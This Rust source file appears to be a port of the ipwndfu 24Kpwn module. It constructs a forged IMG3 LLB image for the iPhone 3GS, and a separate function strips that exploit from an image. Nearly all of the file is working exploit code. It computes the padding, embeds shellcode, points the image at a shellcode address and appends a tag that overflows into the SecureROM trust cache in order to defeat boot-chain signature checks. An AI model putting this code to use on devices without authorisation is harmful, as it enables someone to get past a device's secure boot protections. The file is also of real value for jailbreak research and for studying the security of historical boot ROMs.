//! Port of `image3_24Kpwn.py`: the segment overflow used to pwn iPhone 3GS LLB.
//! Credit: chronic, CPICH, ius, MuscleNerd, Planetbeing, pod2g, posixninja, et al.

use crate::dfuexec::PwnedDFUDevice;
use crate::image3::Image3;
use crate::shellcode;
use crate::utilities::{slice, u32_le};

/// Fixed overhead of the forged IMG3: magic + sizes + the SHSH/CERT tags it always emits.
const TAG_OVERHEAD: u32 = 4 + 12 + 64 + 12 + 12;

const IMG3_MAGIC: &[u8; 4] = b"3gmI";
const ILLB_MAGIC: &[u8; 4] = b"blli";
const SHSH_MAGIC: &[u8; 4] = b"HSHS";
const CERT_MAGIC: &[u8; 4] = b"TREC";
const PWN24KP_MAGIC: &[u8; 4] = b"PK42";
const DATA_MAGIC: &[u8; 4] = b"ATAD";

/// The S5L8920 iBoot branch the forged DATA tag points the loader at.
const SHELLCODE_STUB: [u8; 4] = [0x0e, 0x00, 0x00, 0xea];
const STACK_ADDRESS: u32 = 0x8403_3EA4;

/// `image3_24Kpwn.exploit`
pub fn exploit(img3: &[u8], securerom: &[u8]) -> Vec<u8> {
    let shellcode = shellcode::PWN24KPWN;
    const MAX_SHELLCODE_LENGTH: usize = 1024;
    assert!(shellcode.len() <= MAX_SHELLCODE_LENGTH);

    // Check IMG3 constraints.
    let total_size = u32_le(img3, 4);
    let data_size = u32_le(img3, 8);
    let signed_size = u32_le(img3, 12);
    let kind = &slice(img3, 16, 20);
    assert!(
        slice(img3, 0, 4) == IMG3_MAGIC && signed_size != 0 && kind == ILLB_MAGIC,
        "24Kpwn: input is not a signed LLB"
    );

    let headroom = 0x24000u32 - TAG_OVERHEAD - shellcode.len() as u32 - 12;
    assert!(total_size < headroom, "24Kpwn: LLB total size is too large");
    assert!(
        data_size < headroom - 20,
        "24Kpwn: LLB data size is too large"
    );
    assert!(
        signed_size < headroom - 20,
        "24Kpwn: LLB signed size is too large"
    );
    assert!(
        20 + signed_size + 4 <= img3.len() as u32
            && slice(
                img3,
                (20 + signed_size) as usize,
                (24 + signed_size) as usize
            ) == SHSH_MAGIC,
        "24Kpwn: LLB is not followed by a SHSH tag"
    );

    let padding =
        0x24000i64 - TAG_OVERHEAD as i64 - shellcode.len() as i64 - (20 + signed_size + 12) as i64;
    assert!(padding >= 0, "24Kpwn: negative padding");
    let padding = padding as u32;
    let shellcode_address = 0x8400_0000 + 1 + (20 + signed_size + 12 + padding);

    let mut out: Vec<u8> = Vec::with_capacity(0x24200);
    out.extend_from_slice(IMG3_MAGIC);
    for value in [0x24200u32, 0x241BC, 0x23F88] {
        out.extend_from_slice(&value.to_le_bytes());
    }
    out.extend_from_slice(ILLB_MAGIC);
    out.extend_from_slice(&slice(img3, 20, (20 + signed_size) as usize));

    // 24KP tag carrying the shellcode.
    out.extend_from_slice(PWN24KP_MAGIC);
    for value in [
        12 + padding + shellcode.len() as u32 + 4,
        padding + shellcode.len() as u32 + 4,
    ] {
        out.extend_from_slice(&value.to_le_bytes());
    }
    out.resize(out.len() + padding as usize, 0x00);
    out.extend_from_slice(shellcode);

    // SHSH + CERT tag.
    out.extend_from_slice(&shellcode_address.to_le_bytes());
    out.extend_from_slice(SHSH_MAGIC);
    for value in [12 + 64u32, 64] {
        out.extend_from_slice(&value.to_le_bytes());
    }
    out.resize(out.len() + 64, 0x00);
    out.extend_from_slice(CERT_MAGIC);
    for value in [12u32, 0] {
        out.extend_from_slice(&value.to_le_bytes());
    }

    // Trailing 24KP tag that overflows into the SecureROM trust cache.
    out.extend_from_slice(PWN24KP_MAGIC);
    for value in [12 + 512u32, 512] {
        out.extend_from_slice(&value.to_le_bytes());
    }
    out.extend_from_slice(&slice(securerom, 0xB000, 0xB000 + 460));
    out.extend_from_slice(&STACK_ADDRESS.to_le_bytes());
    out.resize(out.len() + 48, 0x00);

    assert_eq!(out.len(), 0x24200, "24Kpwn: forged IMG3 has the wrong size");
    out
}

/// `image3_24Kpwn.remove_exploit`
pub fn remove_exploit(img3: &[u8], device: &PwnedDFUDevice) -> Vec<u8> {
    assert!(
        img3.len() > 0x24000,
        "LLB is not oversized; nothing to remove"
    );
    assert!(slice(img3, 16, 20) == ILLB_MAGIC, "not an LLB");

    let mut obj = Image3::new(img3);
    if obj.get_decrypted_payload(device).get(..4) != Some(&SHELLCODE_STUB) {
        // This is a 24Kpwn implementation which changes the DATA tag. The first dword of
        // the DATA tag should look like a shellcode address; find the value that restores
        // the original one.
        let shellcode_address = u32_le(img3, 64);
        assert!(
            slice(img3, 52, 56) == DATA_MAGIC,
            "24Kpwn: no DATA tag at 0x34"
        );
        assert!(
            (0x8400_0000..=0x8402_4000).contains(&shellcode_address),
            "24Kpwn: DATA tag does not hold a shellcode address"
        );

        let mut found = false;
        let start = (shellcode_address - 0x8400_0000) as usize;
        for pos in start..img3.len() {
            if pos + 4 > img3.len() {
                break;
            }
            let candidate = [
                slice(img3, 0, 64),
                slice(img3, pos, pos + 4),
                slice(img3, 68, img3.len()),
            ]
            .concat();
            let candidate_obj = Image3::new(&candidate);
            if candidate_obj.get_decrypted_payload(device).get(..4) == Some(&SHELLCODE_STUB) {
                obj = candidate_obj;
                found = true;
                break;
            }
        }
        assert!(found, "24Kpwn: could not locate the original DATA dword");
    }

    obj.shrink_24kpwn_certificate();

    let out = obj.new_image3(None, false);
    assert!(out.len() <= 0x24000, "24Kpwn: LLB is still oversized");
    out
}
